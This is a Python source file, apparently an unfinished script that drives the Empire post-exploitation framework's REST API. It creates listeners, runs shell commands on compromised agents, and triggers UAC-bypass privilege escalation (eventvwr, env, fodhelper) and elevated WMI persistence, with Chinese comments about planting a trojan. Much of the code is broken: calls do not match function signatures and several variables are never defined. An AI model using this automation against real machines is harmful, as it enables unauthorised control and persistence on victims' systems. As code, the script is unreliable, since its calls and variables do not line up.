# /usr/bin/env python3
# -*- coding: utf-8 -*-  
import requests
import argparse
import signal
import sys
import re
import threading
#from termcolor import colored
from argparse import RawTextHelpFormatter
from time import sleep
from requests import ConnectionError
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

__version__ = '0.0.1'

base_url = "https://127.0.0.1:1337"
headers = {'Content-Type': 'application/json'}
listener = 'YouListener'


class KThread(threading.Thread):
    """
    A subclass of threading.Thread, with a kill() method.
    From https://web.archive.org/web/20130503082442/http://mail.python.org/pipermail/python-list/2004-May/281943.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True

def login(empire_username, empire_password):
    payload = {'username': empire_username,
               'password': empire_password}
    print('Powering up ......')
    
    try:
        r = requests.post(base_url+'/api/admin/login', json = payload, headers = headers , verify = False)
        
        if r.status_code == 200:
            return r.json()['token']
        else:
            print('I find your lack of faith disturbing...(Authentication Failed)')
            if debug: print_debug('Status Code: {} Response: {}'.format(r.status_code, r.text))
            sys.exit(1)
    except ConnectionError:
        print_bad('Connection Error. Check Empire RESTful API')
        sys.exit(1)

def get_listener_by_name(token):
    r = requests.get(base_url+'/api/listeners/{}'.format(listener), params = token , verify = False)
    if r.status_code == 200:
        return r.json()
    return False
    
def start_listener(listener_options, token, listener_type = 'http'):
    r = requests.post(base_url + '/api/listeners/{}'.format(listener_type), params = token , headers = headers, json = listener_options ,verify=False)
    if r.status_code == 200:
        r = r.json()
        print('Create listener => {}'.format(r))
        return r
    print(r.json())
    raise 

# change . store response json object ,
def get_agents(token):
    r = requests.get(base_url + '/api/agents', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

def remove_agent(agent_name, token):
    r = requests.delete(base_url + '/api/agents/{}'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    else:
        raise
    
    
def get_agents_results(agent_name):
    r = requests.get(base_url + '/api/agents/{}/results'.format(agent_name), params = token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise
   

def run_shell_command(agent_name, command):
    payload = {'command': command}
    
    try:
        r = requests.post(base_url + '/api/agents/{}/shell'.format(agent_name), params=token, headers=headers, json=payload, verify=False)
        if r.status_code == 200:
            if debug: print_debug("Executed Shell Command => success: {} taskID".format(r['success'], r['taskID'], agent_name))
            return r
        else:
            print_bad("Error executing shell command '{}': {}".format(command, r.json()), agent_name)
    except Exception as e:
        print_bad("Error executing shell command '{}': {}".format(command, e), agent_name)

def run_shell_command_with_results(agent_name, command):
    r = run_shell_command(agent_name, command)
    while True:
        for result in get_agents_results(agent_name, command):
            if result['taskID'] == r['taskID']:
                if len(result['results'].split('\n')) > 1 :
                    return result['results']
        sleep(2)
   
def agent_finished_initializing(agent_dict):    #判断agent有没初始化完成。
    '''
    If these values are None it means the agent hasn't finished initializing on the target
    '''
    if agent_dict['username'] is None or agent_dict['hostname'] is None or agent_dict['os_details'] is None:
        return False
    return True

# API 有变化   
#def execute_module_with_results(module_name, agent_name, module_options = None):
#    r = execute_module(module_name, agent_name, module_options)
#    while True:
#        for result in get_agents_results(agent_name)['results']:
##            if result['taskID'] == r['taskID']:
##                if len(result['results'].split('\n')) > 1 or not result['results'].startswith('Job'):
#                    return result['result']
#        sleep(2)
def execute_module_with_results(module_name, agent_name, module_options = None):
    r = execute_module(module_name, agent_name, module_options)
    #while True:
    #    for result in get_agent_results(agent_name)['results']:
    #        if result['taskID'] == r['taskID']:
    #            if len(result['results'].split('\n')) > 1 or not result['results'].startswith('Job'):
    #                return result['result']
    #    sleep(2)
    for result in get_agent_results(agent_name)['results']:
        if r['success'] == True and result['AgentResults'] != None:
            if len(result['AgentResults']) > 1 or  result['AgentResults'][-1]:
                #print(len(result['AgentResults']))
                return result['AgentResults']


# 这里明明只有执行一次。
def execute_module(token,module_name, agent_name, module_options=None):    #执行一个模块
    payload = {'Agent': agent_name}
    if module_options:
        payload.update(module_options)

    try:
        r = requests.post(base_url + '/api/modules/{}'.format(module_name), params=token, headers=headers, json=payload, verify=False)
        if r.status_code == 200:
            r = r.json()
            if debug: print_debug("Executed Module => success: {} taskID: {} msg: '{}'".format(r['success'], r['taskID'], r['msg']), agent_name)
            return r
        else:
            print_bad("Error executing module '{}': {}".format(module_name, r.json()), agent_name)
    except Exception as e:
        print_bad("Error executing module '{}': {}".format(module_name, e), agent_name)

        
def get_agent_logged_events(agent_name):
    r = requests.get(base_url + '/api/reporting/agent/{}'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise
        
        

# 如果不是高权限就提权如果是，就种入木马
#def pwn_the_target(agent_name):
#    print(agent_name)
#    if not agents[agent_name]['high_integrity']:
#            bypassuac_eventvwr(agent_name)
#            print("Bypassuac is started ! It will have a new High_integrity !\n")
#    else:
#        print("{} is a HighIntegrity Agent . Now Start Persistence Function".format(agent_name))
#        if persisted(agent_name):
#            print("{} had been persisted . We will pass persistence function!!".format(verify_string))
#            return
#        else:
#            persistence(agent_name)
#            print("{} Persistence Done".format(agent_name))
            

# 执行bypassuac_eventvwr提权
# 提权成功会返回一个新的agent会话
def bypassuac_eventvwr(token,agent_name, listener):
    module_options = {"Listener": listener}

    print_info('Attempting to elevate using bypassuac_eventvwr', agent_name)
    execute_module(token,'powershell/privesc/bypassuac_eventvwr', agent_name, module_options)
    
def bypassuac_env(token,agent_name, listener):
    module_options = {"Listener": listener}
    
    print_info('Attempting to elevate using bypassuac_env', agent_name)
    execute_module(token,'powershell/privesc/bypassuac_env', agent_name, module_options)
    
    
def bypassuac_fodhelper(token,agent_name, listener):
    module_options = {"Listener": listener}
    print_info('Attempting to elevate using bypassuac_fodhelper', agent_name)
    execute_module(token,'powershell/privesc/bypassuac_fodhelper', agent_name, module_options)
    
# 增加是否中过木马的判断，主机名和用户名都相同的情况来判断。
# 由于模块自身问题，会触发两次。
def persistence_elevated_wmi(token,agent_name, listener):
    module_options = {'Listener': listener}
    
    print_info('Attempting to persistence', agent_name)
    execute_module(token,'powershell/persistence/elevated/wmi', agent_name, module_options)
    verify_string = agents[agent_name]['hostname'] + agents[agent_name]['username']
    persisted_host.append(persisted)

    
def print_info(msg, agent_name=None):
    print(colored('[*]', 'blue') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_good(msg, agent_name=None):
    print(colored('[+]', 'green') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_bad(msg, agent_name=None):
    print(colored('[-]', 'red') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_debug(msg, agent_name=None):
    print(colored('[DEBUG]', 'cyan') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_win_banner():
    print('\n')
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))

    

